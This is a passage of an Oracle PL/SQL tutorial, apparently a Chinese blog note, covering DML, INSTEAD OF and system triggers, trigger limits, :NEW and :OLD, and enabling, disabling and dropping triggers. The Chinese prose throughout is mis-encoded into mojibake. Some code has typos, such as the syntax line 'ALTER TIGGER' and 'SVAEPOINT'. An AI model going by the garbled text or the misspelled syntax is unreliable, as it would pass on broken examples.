<li>è§¦å‘å™¨åä¸è¿‡ç¨‹åå’ŒåŒ…çš„åå­—ä¸ä¸€æ ·ï¼Œå®ƒæ˜¯å•ç‹¬çš„åå­—ç©ºé—´ï¼Œå› è€Œè§¦å‘å™¨åå¯ä»¥å’Œè¡¨æˆ–è¿‡ç¨‹æœ‰ç›¸åŒçš„åå­—</li>
<li>ä½†åœ¨ä¸€ä¸ªæ¨¡å¼ä¸­è§¦å‘å™¨åä¸èƒ½ç›¸åŒ</li>
</ul>
<h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--ä¾‹ï¼š å»ºç«‹ä¸€ä¸ªè§¦å‘å™¨, å½“èŒå·¥è¡¨ emp è¡¨è¢«åˆ é™¤ä¸€æ¡è®°å½•æ—¶ï¼ŒæŠŠè¢«åˆ é™¤è®°å½•å†™åˆ°èŒå·¥è¡¨åˆ é™¤æ—¥å¿—è¡¨ä¸­å»ã€‚  </span><br><span class="line">CREATE OR REPLACE TRIGGER del_emp  </span><br><span class="line">	BEFORE DELETE ON scott.emp FOR EACH ROW </span><br><span class="line">BEGIN </span><br><span class="line">	--å°†ä¿®æ”¹å‰æ•°æ®æ’å…¥åˆ°æ—¥å¿—è®°å½•è¡¨ del_emp ,ä»¥ä¾›ç›‘ç£ä½¿ç”¨ã€‚ </span><br><span class="line">	INSERT INTO emp_his(deptno,empno,ename,job,mgr,sal,comm,hiredate)VALUES</span><br><span class="line">	(:old.deptno,:old.empno,:old.ename,:old.job,:old.mgr,:old.sal, :old.comm,:old.hiredate); </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h3 id="è§¦å‘å™¨çš„é™åˆ¶"><a href="#è§¦å‘å™¨çš„é™åˆ¶" class="headerlink" title="è§¦å‘å™¨çš„é™åˆ¶"></a>è§¦å‘å™¨çš„é™åˆ¶</h3><ul>
<li>CREATE TRIGGERè¯­å¥æ–‡æœ¬çš„å­—ç¬¦é•¿åº¦ä¸èƒ½è¶…è¿‡32KB<ul>
<li>(ç”±äºå¤§å°å—åˆ°é™åˆ¶ä¹Ÿä¸èƒ½ä½¿ç”¨long,blobè¿™æ ·çš„å¤§å˜é‡.å¦‚æœå®åœ¨æ˜¯æœ‰å¤æ‚çš„é€»è¾‘,è¦å¼„ä¸ªå¾ˆå¤æ‚çš„è§¦å‘å™¨,å¯ä»¥é€šè¿‡procedureæˆ–functionå®ç°ä¸€éƒ¨åˆ†åŠŸèƒ½,ç„¶åè°ƒç”¨)</li>
</ul>
</li>
<li>è§¦å‘å™¨ä½“å†…çš„SELECT è¯­å¥åªèƒ½ä¸ºSELECT â€¦ INTO â€¦ç»“æ„ï¼Œæˆ–è€…ä¸ºå®šä¹‰æ¸¸æ ‡æ‰€ä½¿ç”¨çš„SELECT è¯­å¥</li>
<li>è§¦å‘å™¨ä¸­ä¸èƒ½ä½¿ç”¨æ•°æ®åº“äº‹åŠ¡æ§åˆ¶è¯­å¥ COMMITï¼Œ ROLLBACK, SVAEPOINT è¯­å¥</li>
<li>ç”±è§¦å‘å™¨æ‰€è°ƒç”¨çš„è¿‡ç¨‹æˆ–å‡½æ•°ä¹Ÿä¸èƒ½ä½¿ç”¨æ•°æ®åº“äº‹åŠ¡æ§åˆ¶è¯­å¥</li>
<li>è§¦å‘å™¨ä¸­ä¸èƒ½ä½¿ç”¨LONG, LONG RAW ç±»å‹</li>
<li>è§¦å‘å™¨å†…å¯ä»¥å‚ç…§LOBç±»å‹åˆ—çš„åˆ—å€¼ï¼Œä½†ä¸èƒ½é€šè¿‡ :NEW ä¿®æ”¹LOBåˆ—ä¸­çš„æ•°æ®<ul>
<li>(LOBç±»å‹ï¼šå°†ä¿¡æ¯æ–‡ä»¶ï¼ˆåè¿›åˆ¶ã€äºŒè¿›åˆ¶ï¼‰ã€å›¾åƒç”šè‡³éŸ³é¢‘ä¿¡æ¯é‡‡ç”¨æ•°æ®åº“ä½œä¸ºä¿å­˜è½½ä½“æ—¶ï¼Œå°±éœ€è¦ä½¿ç”¨lobç±»å‹æ•°æ®ã€‚æ¯ä¸ªLOBå¯ä»¥æœ‰2GBã€‚)</li>
</ul>
</li>
<li><ul>
<li>(LOBç±»å‹ï¼šå°†ä¿¡æ¯æ–‡ä»¶ï¼ˆåè¿›åˆ¶ã€äºŒè¿›åˆ¶ï¼‰ã€å›¾åƒç”šè‡³éŸ³é¢‘ä¿¡æ¯é‡‡ç”¨æ•°æ®åº“ä½œä¸ºä¿å­˜è½½ä½“æ—¶ï¼Œå°±éœ€è¦ä½¿ç”¨lobç±»å‹æ•°æ®ã€‚æ¯ä¸ªLOBå¯ä»¥æœ‰2GBã€‚)</li>
</ul>
</li>
</ul>
<h3 id="è¡Œçº§åˆ«è§¦å‘å™¨ä¸­çš„ç›¸å…³æ ‡è¯†ç¬¦"><a href="#è¡Œçº§åˆ«è§¦å‘å™¨ä¸­çš„ç›¸å…³æ ‡è¯†ç¬¦" class="headerlink" title="è¡Œçº§åˆ«è§¦å‘å™¨ä¸­çš„ç›¸å…³æ ‡è¯†ç¬¦"></a>è¡Œçº§åˆ«è§¦å‘å™¨ä¸­çš„ç›¸å…³æ ‡è¯†ç¬¦</h3><p>å½“è§¦å‘å™¨è¢«è§¦å‘æ—¶ï¼Œè¦ä½¿ç”¨è¢«æ’å…¥ã€æ›´æ–°æˆ–åˆ é™¤çš„è®°å½•ä¸­çš„åˆ—å€¼ï¼Œæœ‰æ—¶è¦ä½¿ç”¨æ“ä½œå‰ã€ååˆ—çš„å€¼ ï¼Œå¯ä»¥ä½¿ç”¨ï¼š</p>
<ul>
<li>:NEW ä¿®é¥°ç¬¦è®¿é—®æ“ä½œå®Œæˆååˆ—çš„å€¼</li>
<li>:OLD ä¿®é¥°ç¬¦è®¿é—®æ“ä½œå®Œæˆå‰åˆ—çš„å€¼</li>
</ul>
<table>
<thead>
<tr>
<th align="left">ç‰¹æ€§</th>
<th align="left">INSERT</th>
<th align="left">UPDATE</th>
<th align="left">DELETE</th>
</tr>
</thead>
<tbody><tr>
<td align="left">NEW</td>
<td align="left">æœ‰æ•ˆ</td>
<td align="left">æœ‰æ•ˆ</td>
<td align="left">NULL</td>
</tr>
<tr>
<td align="left">OLD</td>
<td align="left">NULL</td>
<td align="left">æœ‰æ•ˆ</td>
<td align="left">æœ‰æ•ˆ</td>
</tr>
</tbody></table>
<h3 id="ç¤ºä¾‹-1"><a href="#ç¤ºä¾‹-1" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE OR REPLACE TRIGGER upd_emp </span><br><span class="line">	BEFORE update ON scott.emp </span><br><span class="line">  	REFERENCING new AS nn  old AS oo </span><br><span class="line">	FOR EACH ROW </span><br><span class="line">	WHEN (nn.sal &gt; 2000) </span><br><span class="line">BEGIN </span><br><span class="line">	dbms_output.put_line(:nn.sal||&#39;------&#39;||:oo.sal); </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h3 id="DMLè§¦å‘å™¨ä¸­çš„è°“è¯"><a href="#DMLè§¦å‘å™¨ä¸­çš„è°“è¯" class="headerlink" title="DMLè§¦å‘å™¨ä¸­çš„è°“è¯"></a>DMLè§¦å‘å™¨ä¸­çš„è°“è¯</h3><p>åœ¨DMLè§¦å‘å™¨ä¸­ï¼Œä»–ä»¬è¢«ä¸åŒçš„DMLè¯­å¥æ‰€è§¦å‘ï¼Œæœ‰ä¸‰ä¸ªå¸ƒå°”å‹å‡½æ•°æ¥ç¡®å®šæ“ä½œåˆ°åº•æ˜¯ä»€ä¹ˆï¼š</p>
<table>
<thead>
<tr>
<th align="left">è°“è¯</th>
<th align="left">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="left">INSERTING</td>
<td align="left">å¦‚æœè§¦å‘è¯­å¥æ˜¯INSERTï¼Œåˆ™ä¸ºTRUEï¼Œå¦åˆ™ä¸ºFALSE</td>
</tr>
<tr>
<td align="left">UPDATING</td>
<td align="left">å¦‚æœè§¦å‘è¯­å¥æ˜¯UPDATEï¼Œåˆ™ä¸ºTRUEï¼Œå¦åˆ™ä¸ºFALSE</td>
</tr>
<tr>
<td align="left">DELETING</td>
<td align="left">å¦‚æœè§¦å‘è¯­å¥æ˜¯DELETEï¼Œåˆ™ä¸ºTRUEï¼Œå¦åˆ™ä¸ºFALSE</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--ä¾‹</span><br><span class="line">CREATE OR REPLACE TRIGGER check_emp </span><br><span class="line">	BEFORE update OR insert OR delete ON scott.emp </span><br><span class="line">	REFERENCING new AS nn  old AS oo </span><br><span class="line">   	FOR EACH ROW </span><br><span class="line">  	WHEN (nn.sal &gt; 2000) </span><br><span class="line">BEGIN </span><br><span class="line">  	IF INSERTING THEN </span><br><span class="line">  		dbms_output.put_line(&#39;THE OPERATION IS INSERT&#39;); </span><br><span class="line">   	ELSIF UPDATING THEN </span><br><span class="line">		dbms_output.put_line(&#39;THE OPERATION IS UPDATE&#39;); </span><br><span class="line">	ELSIF DELETING THEN </span><br><span class="line">		dbms_output.put_line(&#39;THE OPERATION IS DELETE&#39;); </span><br><span class="line">	ELSE </span><br><span class="line">		dbms_output.put_line(&#39;OTHERS OPERATION&#39;); </span><br><span class="line">	END IF; </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h2 id="åˆ›å»ºæ›¿ä»£è§¦å‘å™¨"><a href="#åˆ›å»ºæ›¿ä»£è§¦å‘å™¨" class="headerlink" title="åˆ›å»ºæ›¿ä»£è§¦å‘å™¨"></a>åˆ›å»ºæ›¿ä»£è§¦å‘å™¨</h2><h3 id="è¯­æ³•-1"><a href="#è¯­æ³•-1" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE [OR REPLACE] TRIGGER trigger_name </span><br><span class="line">INSTEAD OF </span><br><span class="line">	&#123;INSERT | DELETE | UPDATE [OF column [, column â€¦]]&#125; </span><br><span class="line">ON [schema.] view_name </span><br><span class="line">	[REFERENCING &#123;OLD [AS] old | NEW [AS] new&#125;] </span><br><span class="line">	[FOR EACH ROW ] </span><br><span class="line">trigger_body;</span><br></pre></td></tr></table></figure>
<p><strong>æ³¨ï¼š</strong></p>
<ul>
<li>INSTEAD OF<ul>
<li>ä½¿ORACLEæ¿€æ´»è§¦å‘å™¨ï¼Œè€Œä¸æ‰§è¡Œè§¦å‘äº‹ä»¶ã€‚</li>
<li>ä¸DMLè§¦å‘å™¨ä¸åŒï¼ŒDMLè§¦å‘å™¨æ˜¯åœ¨DMLæ“ä½œä¹‹å¤–è¿è¡Œçš„ï¼Œè€Œæ›¿ä»£è§¦å‘å™¨åˆ™ä»£æ›¿æ¿€å‘å®ƒçš„DMLè¯­å¥è¿è¡Œã€‚</li>
<li>æ›¿ä»£è§¦å‘å™¨æ˜¯è¡Œä¸€çº§çš„ã€‚åªèƒ½å¯¹è§†å›¾å’Œå¯¹è±¡è§†å›¾å»ºç«‹INSTEAD OFè§¦å‘å™¨ï¼Œè€Œä¸èƒ½å¯¹è¡¨ã€æ¨¡å¼å’Œæ•°æ®åº“å»ºç«‹INSTEAD OF è§¦å‘å™¨ã€‚</li>
<li>è€ŒINSTEAD OF è§¦å‘å™¨åˆ™ä¸ºè¡Œè§¦å‘å™¨ã€‚</li>
</ul>
</li>
<li>REFERENCING<ul>
<li>è¯´æ˜ç›¸å…³åç§°ï¼Œåœ¨è¡Œè§¦å‘å™¨çš„PL/SQLå—å’ŒWHENå­å¥ä¸­å¯ä»¥ä½¿ç”¨ç›¸å…³åç§°å‚ç…§å½“å‰çš„æ–°ã€æ—§åˆ—å€¼ï¼Œé»˜è®¤çš„ç›¸å…³åç§°åˆ†åˆ«ä¸ºOLDå’ŒNEWã€‚</li>
<li>è§¦å‘å™¨çš„PL/SQLå—ä¸­åº”ç”¨ç›¸å…³åç§°æ—¶ï¼Œå¿…é¡»åœ¨å®ƒä»¬ä¹‹å‰åŠ å†’å·(:)ï¼Œä½†åœ¨WHENå­å¥ä¸­åˆ™ä¸èƒ½åŠ å†’å·ã€‚ WHEN å­å¥è¯´æ˜è§¦å‘çº¦æŸæ¡ä»¶ã€‚</li>
<li>Condition ä¸ºä¸€ä¸ªé€»è¾‘è¡¨è¾¾æ—¶ï¼Œå…¶ä¸­å¿…é¡»åŒ…å«ç›¸å…³åç§°ï¼Œè€Œä¸èƒ½åŒ…å«æŸ¥è¯¢è¯­å¥ï¼Œä¹Ÿä¸èƒ½è°ƒç”¨PL/SQL å‡½æ•°ã€‚</li>
</ul>
</li>
<li>WHEN<ul>
<li>æŒ‡å®šçš„è§¦å‘çº¦æŸæ¡ä»¶åªèƒ½ç”¨åœ¨BEFORE å’ŒAFTER è¡Œè§¦å‘å™¨ä¸­ï¼Œä¸èƒ½ç”¨åœ¨INSTEAD OF è¡Œè§¦å‘å™¨å’Œå…¶å®ƒç±»å‹çš„è§¦å‘å™¨ä¸­ã€‚</li>
</ul>
</li>
<li>INSTEAD_OF<ul>
<li>ç”¨äºå¯¹è§†å›¾çš„DMLè§¦å‘ï¼Œç”±äºè§†å›¾æœ‰å¯èƒ½æ˜¯ç”±å¤šä¸ªè¡¨è¿›è¡Œè”ç»“(join)è€Œæˆï¼Œå› è€Œå¹¶éæ˜¯æ‰€æœ‰çš„è”ç»“éƒ½æ˜¯å¯æ›´æ–°çš„ã€‚ä½†å¯ä»¥æŒ‰ç…§æ‰€éœ€çš„æ–¹å¼æ‰§è¡Œæ›´æ–°</li>
</ul>
</li>
</ul>
<h3 id="æ›¿ä»£è§¦å‘å™¨åº”ç”¨ä¸¾ä¾‹"><a href="#æ›¿ä»£è§¦å‘å™¨åº”ç”¨ä¸¾ä¾‹" class="headerlink" title="æ›¿ä»£è§¦å‘å™¨åº”ç”¨ä¸¾ä¾‹"></a>æ›¿ä»£è§¦å‘å™¨åº”ç”¨ä¸¾ä¾‹</h3><p>æˆ‘ä»¬å¯ä»¥åˆ›å»ºINSTEAD_OFè§¦å‘å™¨æ¥ä¸º DELETE æ“ä½œæ‰§è¡Œæ‰€éœ€çš„å¤„ç†ï¼Œå³åˆ é™¤EMPè¡¨ä¸­æ‰€æœ‰åŸºå‡†è¡Œï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE OR REPLACE TRIGGER emp_view_delete </span><br><span class="line">	INSTEAD OF DELETE ON emp_view FOR EACH ROW </span><br><span class="line">BEGIN </span><br><span class="line">	DELETE FROM emp WHERE deptno&#x3D; :old.deptno; </span><br><span class="line">END emp_view_delete; </span><br><span class="line">DELETE FROM emp_view WHERE deptno&#x3D;10;</span><br></pre></td></tr></table></figure>
<h2 id="åˆ›å»ºç³»ç»Ÿè§¦å‘å™¨"><a href="#åˆ›å»ºç³»ç»Ÿè§¦å‘å™¨" class="headerlink" title="åˆ›å»ºç³»ç»Ÿè§¦å‘å™¨"></a>åˆ›å»ºç³»ç»Ÿè§¦å‘å™¨</h2><ul>
<li>ç³»ç»Ÿè§¦å‘å™¨å¯ä»¥åœ¨DDLæˆ–æ•°æ®åº“ç³»ç»Ÿä¸Šè¢«è§¦å‘ã€‚DDLæŒ‡çš„æ˜¯æ•°æ®å®šä¹‰è¯­è¨€ï¼Œå¦‚CREATE ã€ALTERåŠDROP ç­‰ã€‚</li>
<li>æ•°æ®åº“ç³»ç»Ÿäº‹ä»¶åŒ…æ‹¬æ•°æ®åº“æœåŠ¡å™¨çš„å¯åŠ¨æˆ–å…³é—­ï¼Œç”¨æˆ·çš„ç™»å½•ä¸é€€å‡ºã€æ•°æ®åº“æœåŠ¡é”™è¯¯ç­‰ã€‚</li>
</ul>
<h3 id="è¯­æ³•-2"><a href="#è¯­æ³•-2" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE OR REPLACE TRIGGER [sachema.] trigger_name </span><br><span class="line">	&#123;BEFORE|AFTER&#125;   </span><br><span class="line">	&#123;ddl_event_list | database_event_list&#125; </span><br><span class="line">ON &#123; DATABASE | [schema.] SCHEMA &#125; </span><br><span class="line">	[WHEN_clause]  </span><br><span class="line">trigger_body;</span><br></pre></td></tr></table></figure>
<p><strong>æ³¨ï¼š</strong></p>
<ul>
<li>ddl_event_listä¸ºä¸€ä¸ªæˆ–å¤šä¸ªDDLäº‹ä»¶ï¼Œäº‹ä»¶é—´ç”¨ OR åˆ†å¼€ï¼›</li>
<li>database_event_listä¸ºä¸€ä¸ªæˆ–å¤šä¸ªæ•°æ®åº“äº‹ä»¶ï¼Œäº‹ä»¶é—´ç”¨ OR åˆ†å¼€ï¼›</li>
<li>ç³»ç»Ÿäº‹ä»¶è§¦å‘å™¨æ—¢å¯ä»¥å»ºç«‹åœ¨ä¸€ä¸ªæ¨¡å¼ä¸Šï¼Œåˆå¯ä»¥å»ºç«‹åœ¨æ•´ä¸ªæ•°æ®åº“ä¸Šã€‚<ul>
<li>å½“å»ºç«‹åœ¨æ¨¡å¼(SCHEMA)ä¹‹ä¸Šæ—¶ï¼Œåªæœ‰æ¨¡å¼æ‰€æŒ‡å®šç”¨æˆ·çš„DDLæ“ä½œå’Œå®ƒä»¬æ‰€å¯¼è‡´çš„é”™è¯¯æ‰æ¿€æ´»è§¦å‘å™¨, é»˜è®¤æ—¶ä¸ºå½“å‰ç”¨æˆ·æ¨¡å¼ã€‚</li>
<li>å½“å»ºç«‹åœ¨æ•°æ®åº“(DATABASE)ä¹‹ä¸Šæ—¶ï¼Œè¯¥æ•°æ®åº“æ‰€æœ‰ç”¨æˆ·çš„DDLæ“ä½œå’Œä»–ä»¬æ‰€å¯¼è‡´çš„é”™è¯¯ï¼Œä»¥åŠæ•°æ®åº“çš„å¯åŠ¨å’Œå…³é—­å‡å¯æ¿€æ´»è§¦å‘å™¨ã€‚</li>
<li>è¦åœ¨æ•°æ®åº“ä¹‹ä¸Šå»ºç«‹è§¦å‘å™¨æ—¶ï¼Œè¦æ±‚ç”¨æˆ·å…·æœ‰ADMINISTER DATABASE TRIGGERæƒé™ã€‚</li>
</ul>
</li>
</ul>
<h3 id="ç³»ç»Ÿè§¦å‘å™¨çš„ç§ç±»å’Œäº‹ä»¶å‡ºç°çš„æ—¶æœºï¼ˆå‰æˆ–åï¼‰ï¼š"><a href="#ç³»ç»Ÿè§¦å‘å™¨çš„ç§ç±»å’Œäº‹ä»¶å‡ºç°çš„æ—¶æœºï¼ˆå‰æˆ–åï¼‰ï¼š" class="headerlink" title="ç³»ç»Ÿè§¦å‘å™¨çš„ç§ç±»å’Œäº‹ä»¶å‡ºç°çš„æ—¶æœºï¼ˆå‰æˆ–åï¼‰ï¼š"></a>ç³»ç»Ÿè§¦å‘å™¨çš„ç§ç±»å’Œäº‹ä»¶å‡ºç°çš„æ—¶æœºï¼ˆå‰æˆ–åï¼‰ï¼š</h3><table>
<thead>
<tr>
<th align="left">äº‹ä»¶</th>
<th align="left">å…è®¸çš„æ—¶æœº</th>
<th align="left">è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td align="left">å¯åŠ¨STARTUP</td>
<td align="left">ä¹‹å</td>
<td align="left">å®ä¾‹å¯åŠ¨æ—¶æ¿€æ´»</td>
</tr>
<tr>
<td align="left">å…³é—­SHUTDOWN</td>
<td align="left">ä¹‹å‰</td>
<td align="left">å®ä¾‹æ­£å¸¸å…³é—­æ—¶æ¿€æ´»</td>
</tr>
<tr>
<td align="left">æœåŠ¡å™¨é”™è¯¯SERVERERROR</td>
<td align="left">ä¹‹å</td>
<td align="left">åªè¦æœ‰é”™è¯¯å°±æ¿€æ´»</td>
</tr>
<tr>
<td align="left">ç™»å½•LOGON</td>
<td align="left">ä¹‹å</td>
<td align="left">æˆåŠŸç™»å½•åæ¿€æ´»</td>
</tr>
<tr>
<td align="left">æ³¨é”€LOGOFF</td>
<td align="left">ä¹‹å‰</td>
<td align="left">å¼€å§‹æ³¨é”€æ—¶æ¿€æ´»</td>
</tr>
<tr>
<td align="left">åˆ›å»ºCREATE</td>
<td align="left">ä¹‹å‰ï¼Œä¹‹å</td>
<td align="left">åœ¨åˆ›å»ºä¹‹å‰æˆ–ä¹‹åæ¿€æ´»</td>
</tr>
<tr>
<td align="left">æ’¤æ¶ˆDROP</td>
<td align="left">ä¹‹å‰ï¼Œä¹‹å</td>
<td align="left">åœ¨æ’¤æ¶ˆä¹‹å‰æˆ–ä¹‹åæ¿€æ´»</td>
</tr>
<tr>
<td align="left">å˜æ›´ALTER</td>
<td align="left">ä¹‹å‰ï¼Œä¹‹å</td>
<td align="left">åœ¨å˜æ›´ä¹‹å‰æˆ–ä¹‹åæ¿€æ´»</td>
</tr>
</tbody></table>
<h3 id="ç¤ºä¾‹-2"><a href="#ç¤ºä¾‹-2" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE OR REPLACE TRIGGER trig4_ddl </span><br><span class="line">	AFTER CREATE OR ALTER OR DROP  ON DATABASE </span><br><span class="line">DECLARE </span><br><span class="line">	Event VARCHAR2(20); Typ VARCHAR2(20); </span><br><span class="line">	Name VARCHAR2(30);  Owner VARCHAR2(30); </span><br><span class="line">BEGIN </span><br><span class="line">	--è¯»å–DDLäº‹ä»¶å±æ€§ </span><br><span class="line">	Event :&#x3D; SYSEVENT;     --æ¿€æ´»è§¦å‘å™¨çš„äº‹ä»¶åç§°   </span><br><span class="line">    Typ :&#x3D; DICTIONARY_OBJ_TYPE;  --è¯­å¥æ‰€æ“ä½œçš„æ•°æ®åº“å¯¹è±¡ç±»å‹  </span><br><span class="line">	Name :&#x3D; DICTIONARY_OBJ_NAME; --è¯­å¥æ‰€æ“ä½œçš„æ•°æ®åº“å¯¹è±¡åç§°  </span><br><span class="line">	Owner :&#x3D; DICTIONARY_OBJ_OWNER; --è¯­å¥æ‰€æ“ä½œçš„æ•°æ®åº“å¯¹è±¡æ‰€æœ‰è€…åç§°  </span><br><span class="line">    -- å°†äº‹ä»¶å±æ€§æ’å…¥åˆ°äº‹ä»¶æ—¥å¿—è¡¨ä¸­ </span><br><span class="line">    INSERT INTO scott.eventlog(eventname,obj_type,obj_name,obj_owner) </span><br><span class="line">    	VALUES(event, typ, name, owner); </span><br><span class="line">END;</span><br></pre></td></tr></table></figure>
<h2 id="é‡æ–°ç¼–è¯‘è§¦å‘å™¨"><a href="#é‡æ–°ç¼–è¯‘è§¦å‘å™¨" class="headerlink" title="é‡æ–°ç¼–è¯‘è§¦å‘å™¨"></a>é‡æ–°ç¼–è¯‘è§¦å‘å™¨</h2><ul>
<li><p>å¦‚æœåœ¨è§¦å‘å™¨å†…è°ƒç”¨å…¶å®ƒå‡½æ•°æˆ–è¿‡ç¨‹ï¼Œå½“è¿™äº›å‡½æ•°æˆ–è¿‡ç¨‹è¢«åˆ é™¤æˆ–ä¿®æ”¹åï¼Œè§¦å‘å™¨çš„çŠ¶æ€å°†è¢«æ ‡è¯†ä¸ºæ— æ•ˆã€‚å½“DMLè¯­å¥æ¿€æ´»ä¸€ä¸ªæ— æ•ˆè§¦å‘å™¨æ—¶ï¼ŒORACLEå°†é‡æ–°ç¼–è¯‘è§¦å‘å™¨ä»£ç ï¼Œå¦‚æœç¼–è¯‘æ—¶å‘ç°é”™è¯¯ï¼Œè¿™å°†å¯¼è‡´DMLè¯­å¥æ‰§è¡Œå¤±è´¥ã€‚</p>
</li>
<li><p>åœ¨PL/SQLç¨‹åºä¸­å¯ä»¥è°ƒç”¨ALTER TRIGGERè¯­å¥é‡æ–°ç¼–è¯‘å·²ç»åˆ›å»ºçš„è§¦å‘å™¨ï¼Œæ ¼å¼ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ALTER TRIGGER [schema.] trigger_name COMPILE</span><br></pre></td></tr></table></figure>
<h2 id="åˆ é™¤è§¦å‘å™¨"><a href="#åˆ é™¤è§¦å‘å™¨" class="headerlink" title="åˆ é™¤è§¦å‘å™¨"></a>åˆ é™¤è§¦å‘å™¨</h2></li>
</ul>
<h3 id="è¯­æ³•-3"><a href="#è¯­æ³•-3" class="headerlink" title="è¯­æ³•"></a>è¯­æ³•</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DROP TRIGGER trigger_name;</span><br></pre></td></tr></table></figure>
<p><strong>æ³¨ï¼š</strong></p>
<ul>
<li>å½“åˆ é™¤å…¶ä»–ç”¨æˆ·æ¨¡å¼ä¸­çš„è§¦å‘å™¨åç§°ï¼Œéœ€è¦å…·æœ‰DROP ANY TRIGGERç³»ç»Ÿæƒé™</li>
<li>å½“åˆ é™¤å»ºç«‹åœ¨æ•°æ®åº“ä¸Šçš„è§¦å‘å™¨æ—¶ï¼Œç”¨æˆ·éœ€è¦å…·æœ‰ADMINISTER DATABASE TRIGGERç³»ç»Ÿæƒé™</li>
<li>å½“åˆ é™¤è¡¨æˆ–è§†å›¾æ—¶ï¼Œå»ºç«‹åœ¨è¿™äº›å¯¹è±¡ä¸Šçš„è§¦å‘å™¨ä¹Ÿéšä¹‹åˆ é™¤</li>
</ul>
<h2 id="è§¦å‘å™¨çŠ¶æ€"><a href="#è§¦å‘å™¨çŠ¶æ€" class="headerlink" title="è§¦å‘å™¨çŠ¶æ€"></a>è§¦å‘å™¨çŠ¶æ€</h2><h3 id="æœ‰æ•ˆçŠ¶æ€-ENABLE"><a href="#æœ‰æ•ˆçŠ¶æ€-ENABLE" class="headerlink" title="æœ‰æ•ˆçŠ¶æ€(ENABLE)"></a>æœ‰æ•ˆçŠ¶æ€(ENABLE)</h3><ul>
<li>å½“è§¦å‘äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œå¤„äºæœ‰æ•ˆçŠ¶æ€çš„æ•°æ®åº“è§¦å‘å™¨TRIGGER å°†è¢«è§¦å‘ã€‚</li>
</ul>
<h3 id="æ— æ•ˆçŠ¶æ€-DISABLE"><a href="#æ— æ•ˆçŠ¶æ€-DISABLE" class="headerlink" title="æ— æ•ˆçŠ¶æ€(DISABLE)"></a>æ— æ•ˆçŠ¶æ€(DISABLE)</h3><ul>
<li>å½“è§¦å‘äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œå¤„äºæ— æ•ˆçŠ¶æ€çš„æ•°æ®åº“è§¦å‘å™¨TRIGGER å°†ä¸ä¼šè¢«è§¦å‘ï¼Œæ­¤æ—¶å°±è·Ÿæ²¡æœ‰è¿™ä¸ªæ•°æ®åº“è§¦å‘å™¨(TRIGGER) ä¸€æ ·ã€‚</li>
</ul>
<h3 id="æ•°æ®åº“TRIGGERçš„è¿™ä¸¤ç§çŠ¶æ€å¯ä»¥äº’ç›¸è½¬æ¢"><a href="#æ•°æ®åº“TRIGGERçš„è¿™ä¸¤ç§çŠ¶æ€å¯ä»¥äº’ç›¸è½¬æ¢" class="headerlink" title="æ•°æ®åº“TRIGGERçš„è¿™ä¸¤ç§çŠ¶æ€å¯ä»¥äº’ç›¸è½¬æ¢"></a>æ•°æ®åº“TRIGGERçš„è¿™ä¸¤ç§çŠ¶æ€å¯ä»¥äº’ç›¸è½¬æ¢</h3><ul>
<li>ALTER TRIGGERè¯­å¥ä¸€æ¬¡åªèƒ½æ”¹å˜ä¸€ä¸ªè§¦å‘å™¨çš„çŠ¶æ€</li>
<li>ALTER TABLEè¯­å¥åˆ™ä¸€æ¬¡èƒ½å¤Ÿæ”¹å˜ä¸æŒ‡å®šè¡¨ç›¸å…³çš„æ‰€æœ‰è§¦å‘å™¨çš„ä½¿ç”¨çŠ¶æ€ã€‚</li>
</ul>
<h4 id="ALTER-TIGGER"><a href="#ALTER-TIGGER" class="headerlink" title="ALTER TIGGER"></a>ALTER TIGGER</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ALTER TIGGER trigger_name [DISABLE | ENABLE ]; </span><br><span class="line"></span><br><span class="line">--ä¾‹ï¼š</span><br><span class="line">ALTER TRIGGER emp_view_delete DISABLE;</span><br></pre></td></tr></table></figure>
<h4 id="ALTER-TABLE"><a href="#ALTER-TABLE" class="headerlink" title="ALTER TABLE"></a>ALTER TABLE</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ALTER TABLE [schema.]table_name &#123;ENABLE|DISABLE&#125; ALL TRIGGERS;  </span><br><span class="line"></span><br><span class="line">--ä¾‹ï¼šä½¿è¡¨EMP ä¸Šçš„æ‰€æœ‰TRIGGER å¤±æ•ˆï¼š </span><br><span class="line">ALTER TABLE emp DISABLE ALL TRIGGERS;</span><br></pre></td></tr></table></figure>
<h2 id="è§¦å‘å™¨å’Œæ•°æ®å­—å…¸"><a href="#è§¦å‘å™¨å’Œæ•°æ®å­—å…¸" class="headerlink" title="è§¦å‘å™¨å’Œæ•°æ®å­—å…¸"></a>è§¦å‘å™¨å’Œæ•°æ®å­—å…¸</h2><p><strong>ç›¸å…³æ•°æ®å­—å…¸ï¼š</strong></p>
<ul>
<li>USER_TRIGGERS</li>
<li>ALL_TRIGGERS</li>
<li>DBA_TRIGGERS</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--ä¾‹ï¼š</span><br><span class="line">SELECT TRIGGER_NAME, TRIGGER_TYPE, TRIGGERING_EVENT, TABLE_OWNER, </span><br><span class="line">	   BASE_OBJECT_TYPE, REFERENCING_NAMES, STATUS, ACTION_TYPE </span><br><span class="line">	FROM user_triggers;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Note</category>
        <category>Oracle</category>
